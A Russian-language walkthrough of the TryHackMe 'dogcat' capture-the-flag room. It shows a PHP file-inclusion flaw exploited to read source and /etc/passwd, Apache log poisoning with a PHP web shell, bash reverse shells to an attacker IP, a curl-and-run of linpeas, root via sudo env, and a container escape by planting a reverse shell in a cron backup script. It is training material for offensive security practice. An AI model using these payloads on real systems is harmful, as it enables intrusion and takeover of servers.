https://tryhackme.com/room/dogcat
# Описание
 Я сделал сайт, на котором можно смотреть фотографии собак и/или кошек! Используйте приложение PHP через LFI и выйдите из контейнера Docker.
Я сделал этот сайт для просмотра изображений кошек и собак с помощью PHP. Если вам грустно, приходите посмотреть на собак/кошек!

> [!NOTE]
> IP:10.10.138.40

![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419112702.png)


> [!NOTE]
> 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
> 80/tcp open  http    Apache httpd 2.4.38 ((Debian))

![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419112815.png)

![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419112829.png)

> [!NOTE]
> /?view=cat
> /?view=dog

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://10.10.138.40:80/FFUZ -ic -c
```

![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419114939.png)

> [!NOTE]
> Используется функция include в php!
> https://www.php.net/manual/en/function.include.php
> FFUF
> http://10.10.138.40/dogs/1-10.jpg
> http://10.10.138.40/сats/1-10.jpg
> 
> 

# LFI to RCE
http://10.10.138.40/?view=dog1
```
include(dog1.php): failed to open stream: No such file or directory in /var/www/html/index.php
<br />
include(): Failed opening 'dog1.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php
```

> [!NOTE]
> https://www.immuniweb.com/vulnerability/php-file-inclusion.html
> 
> http://10.10.138.40/?view=php://filter/convert.base64-encode/resource=dog
> В данном случае с помощью фильтра можем читать конечные файлы в base64
> ==php://filter/convert.base64-encode/resource=index.php==

![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419114833.png)

```
echo "PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```

```
echo "PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
<img src="cats/<?php echo rand(1, 10); ?>.jpg" />
```
 
```
http://10.10.138.40/?view=php://filter/convert.base64-encode/resource=dog/../index
```

```
echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" |base64 -d
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>

```

# Логика работы приложения
```
<?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
```

> [!NOTE]
> Таким образом, можно задать расширение через &ext

```
http://10.10.138.40/?view=dog/../../../../etc/passwd&ext=
```

```
|root:x:0:0:root:/root:/bin/bash|
||daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin|
||bin:x:2:2:bin:/bin:/usr/sbin/nologin|
||sys:x:3:3:sys:/dev:/usr/sbin/nologin|
||sync:x:4:65534:sync:/bin:/bin/sync|
||games:x:5:60:games:/usr/games:/usr/sbin/nologin|
||man:x:6:12:man:/var/cache/man:/usr/sbin/nologin|
||lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin|
||mail:x:8:8:mail:/var/mail:/usr/sbin/nologin|
||news:x:9:9:news:/var/spool/news:/usr/sbin/nologin|
||uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin|
||proxy:x:13:13:proxy:/bin:/usr/sbin/nologin|
||www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin|
||backup:x:34:34:backup:/var/backups:/usr/sbin/nologin|
||list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin|
||irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin|
||gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin|
||nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin|
||_apt:x:100:65534::/nonexistent:/usr/sbin/nologin|
```

# RCE

> [!NOTE]
> Все замечательно. На 80 порту работает apache можно попробовать дотянуться до логов  
> https://www.hackingarticles.in/apache-log-poisoning-through-lfi/

```
<?php system($_GET['c']); ?>
```

![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419184704.png)

![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419184815.png)

# Реверс
```
bash -c 'bash -i &>/dev/tcp/10.11.134.170/1337 <&1' 
```

# В URL code
```
/?view=dog/../../../../var/log/apache2/access&ext=.log&c=bash -c 'bash -i %26>%2fdev%2ftcp%2f10.11.134.170%2f1337 <%261'%20
```

# 1 flag
![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419185456.png)
# 2 flag в директории ниже
![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419185539.png)

# Проведу перечисление с помощью linpeas
```
https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```


```
curl http://10.11.134.170:80/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

> [!NOTE]
> linpeas 
> Находимся в контейнере

![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419190614.png)

![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419190725.png)

https://gtfobins.github.io/
![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419191112.png)

```
www-data@325fa62d34e6:/tmp$ sudo env /bin/bash
sudo env /bin/bash
id
uid=0(root) gid=0(root) groups=0(root)
```

# Эскалация привилегий и выход из контейнера
![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419193710.png)
![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419193739.png)
```
echo "#!/bin/bash" > /opt/backups/backup.sh
echo "bash -i &>/dev/tcp/10.11.134.170/1338 <&1 " >> /opt/backups/backup.sh
chmod +x /opt/backups/backup.sh
/opt/backups/backup.sh
```

# 4 flag
![DogCat](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/dogcat/screenshots/20250419193459.png)